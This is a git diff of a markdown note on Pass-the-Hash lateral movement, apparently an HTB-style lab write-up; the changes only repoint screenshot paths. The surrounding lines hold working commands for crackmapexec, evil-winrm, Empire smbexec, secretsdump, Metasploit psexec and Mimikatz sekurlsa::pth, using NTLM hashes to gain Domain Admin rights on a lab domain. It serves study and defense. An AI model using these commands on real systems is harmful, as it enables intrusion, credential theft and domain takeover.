@@ -29,7 +29,7 @@ crackmapexec smb <IP> -u <User> -H <NTLM> --local-auth
 crackmapexec smb '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71' --local-auth
 ```
 
-![](../../../Assets/Pasted%20image%2020250619215540.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619215540.png)
 
 ### Empire
 
@@ -45,7 +45,7 @@ usemodule lateral_movement/invoke_smbexec
 (Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > execute
 ```
 
-![](../../../Assets/Pasted%20image%2020250619215550.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619215550.png)
 
 ### Evil-WinRM
 
@@ -54,7 +54,7 @@ evil-winrm -i <IP> -u <User> -H <NThash>
 evil-winrm -i '10.10.10.100' -u 'moe' -H '58a478135a93ac3bf058a5ea0e8fdb71'
 ```
 
-![](../../../Assets/Pasted%20image%2020250619215558.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619215558.png)
 
 ### LDAP
 
@@ -63,7 +63,7 @@ secretsdump.py <User>@<IP> -hashes <Hash>
 secretsdump.py moe@10.10.10.100 -hashes aad321b35b51404eeaad982b5b51404ee:b38ff50264b7458734d82c69794a4d8
 ```
 
-![](../../../Assets/Pasted%20image%2020250619215610.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619215610.png)
 
 ### Metasploit
 
@@ -74,7 +74,7 @@ use exploit/windows/smb/psexec
 set smbpass "aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71"
 ```
 
-![](../../../Assets/Pasted%20image%2020250619215617.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619215617.png)
 
 ### Smbclient
 
@@ -150,7 +150,7 @@ By doing so we are able to then use the newly spawned PowerShell process to perf
 
 Under our local administrator account and as expected, we are unable to create a new domain user.
 
-![](../../../Assets/Pasted%20image%2020250619215721.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619215721.png)
 
 Next we Pass-The-Hash for the Domain Administrator Moe:
 
@@ -158,11 +158,11 @@ Next we Pass-The-Hash for the Domain Administrator Moe:
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Moe /domain:Security.local /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:powershell.exe"'
 ```
 
-![](../../../Assets/Pasted%20image%2020250619215736.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619215736.png)
 
 Which opens a new PowerShell process for us. Where, we still notice we are running as the local administrator on the member server SRV01 however, we now have the ability to work as the Domain Administrator Moe and create a new domain user and add them to the "Domain Admins" group.
 
-![](../../../Assets/Pasted%20image%2020250619215745.png)
+![](../../../Writeups/HTB/Assets/Pasted%20image%2020250619215745.png)
 
 ## Mitigation
 
